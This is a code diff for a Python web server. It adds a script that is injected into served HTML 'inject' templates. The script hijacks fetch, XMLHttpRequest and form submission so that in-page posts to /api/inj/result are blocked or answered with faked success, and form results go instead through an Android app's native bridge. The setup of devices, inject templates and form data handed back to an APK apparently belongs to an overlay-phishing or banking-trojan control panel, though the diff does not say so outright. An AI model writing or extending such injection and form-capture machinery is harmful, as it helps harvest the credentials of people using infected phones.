@@ -1462,6 +1462,69 @@ def _preload_devices_from_db():
         print('[boot] preload devices failed: %s' % e, flush=True)
 
 
+_INJECT_BLOCK_JS = """
+<script>
+/* 由服务端注入：禁止模板自己 POST /api/inj/result。
+   提交统一走 APK 原生桥（Android.returnResult / FKB.setFormData），
+   否则同一次提交会被上报两次（网页一次 + 原生一次）。*/
+(function(){
+  var B='/api/inj/result';
+  try{
+    var of=window.fetch;
+    window.fetch=function(u,o){
+      try{
+        var s=(typeof u==='string')?u:(u&&u.url)||'';
+        var m=String((o&&o.method)||'GET').toUpperCase();
+        if(s.indexOf(B)>=0&&m==='POST'){
+          console.log('[inj] blocked html POST');
+          return Promise.resolve(new Response('{"ok":true,"blocked":true}',{status:200,headers:{'Content-Type':'application/json'}}));
+        }
+      }catch(e){}
+      return of.apply(this,arguments);
+    };
+  }catch(e){}
+  try{
+    var oo=XMLHttpRequest.prototype.open;
+    XMLHttpRequest.prototype.open=function(m,u){
+      try{
+        if(String(u).indexOf(B)>=0&&String(m).toUpperCase()==='POST'){
+          this.send=function(){console.log('[inj] blocked html xhr');};
+          return;
+        }
+      }catch(e){}
+      return oo.apply(this,arguments);
+    };
+  }catch(e){}
+  try{
+    window.addEventListener('submit',function(ev){
+      var a=ev.target&&ev.target.action||'';
+      if(String(a).indexOf(B)>=0){ev.preventDefault();console.log('[inj] blocked html form');}
+    },true);
+  }catch(e){}
+})();
+</script>
+"""
+
+
+def _inject_block(html):
+    """把上面的脚本塞进模板 HTML（放在 <head> 后或文件最前）。"""
+    try:
+        if not html:
+            return html
+        if '_inj_blocked_' in html:
+            return html
+        tag = '<script>/*_inj_blocked_*/</script>'
+        js = _INJECT_BLOCK_JS.replace('<script>', '<script>/*_inj_blocked_*/')
+        low = html.lower()
+        i = low.find('<head')
+        if i >= 0:
+            j = html.find('>', i)
+            if j > 0:
+                return html[:j+1] + js + html[j+1:]
+        return js + html
+    except Exception:
+        return html
+
 def mount_full_surface(app):
     """把契约面全部挂上：api_impl 有真逻辑的走真逻辑，其余显式 contract_only"""
     import api_impl
@@ -1721,7 +1784,7 @@ def mount_full_surface(app):
         if not os.path.isfile(path):
             return web.Response(status=404, text='not found')
         with open(path, encoding='utf-8') as fh:
-            return web.Response(text=fh.read(), content_type='text/html')
+            return web.Response(text=_inject_block(fh.read()), content_type='text/html')
     app.router.add_get('/inject/file/{name}', inject_file_public)
 
     async def oem_policy_get(request):
